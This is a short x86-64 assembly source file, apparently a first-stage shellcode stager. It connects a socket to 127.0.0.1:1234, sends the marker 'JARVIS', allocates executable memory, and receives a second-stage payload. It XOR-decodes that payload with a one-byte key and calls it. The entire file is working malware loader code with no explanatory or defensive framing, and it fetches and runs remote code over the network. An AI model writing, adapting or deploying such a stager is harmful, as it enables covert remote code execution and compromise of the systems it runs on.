BITS 64

call START
START:
pop r9
sub r9, START

;create socket
mov rdx,6
mov rsi,1
mov rdi,2
mov rax,41
syscall

;save fd

mov r8,rax

; Create structure
;xor r9,r9
push rax
push rax


mov BYTE  [rsp] , 2

mov WORD  [rsp+2], 0xd204
mov DWORD [rsp+4], 0x100007f

mov rdx , 0x10
mov rsi , rsp
mov rdi , r8
mov rax , 42
syscall


;r8 is the socket opened
mov rdx, 6
lea rsi, [r9+MAGIC]
mov rdi, r8
mov rax, 1
syscall


;Prevent from wiping regsiters in mmap syscall
push r8
push r9

;Adding a mmap syscall
xor r8,r8
xor r9,r9
mov r10 , 0x21
mov rdx, 7
mov rsi , 0x10000
xor rdi,rdi
mov rax,9
syscall
;r10 next stage
;r9 current base
;r8 socket descripter
mov r10,rax
pop r9
pop r8

;Get next stage length
push rax
mov rdx,8
mov rsi, rsp
mov rdi, r8
xor rax, rax
syscall

;Length of stage
pop rdx
push rdx


mov rsi, r10
mov rdi,r8
xor rax,rax
syscall

pop r11
;Decrypt routine
mov rdi, r10
mov rsi, r11
mov rax, r11

DECRYPT:

xor BYTE [rdi], SIL
inc rdi
dec rax
test rax,rax
jnz DECRYPT

mov rax, r8

call r10

MAGIC:
		db "JARVIS", 0